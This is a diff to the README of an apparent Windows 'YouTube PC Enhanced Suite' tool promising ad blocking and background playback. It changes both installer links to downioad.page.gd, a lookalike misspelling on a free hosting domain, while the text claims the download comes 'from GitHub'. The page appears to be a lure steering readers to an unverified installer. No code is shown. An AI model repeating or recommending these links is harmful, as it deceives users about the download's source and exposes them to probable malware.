@@ -2,7 +2,7 @@
 
 YouTube PC Enhanced Suite is a powerful tool designed to elevate your YouTube experience on Windows desktop. It provides a suite of features to block ads, enable background playback, and optimize performance for a seamless viewing experience.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -66,7 +66,7 @@ A: Yes, you can install YouTube PC Enhanced Suite on multiple Windows computers,
 
 For the latest version of YouTube PC Enhanced Suite, please use the following link:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 **Last Updated**: January 1, 2026
 
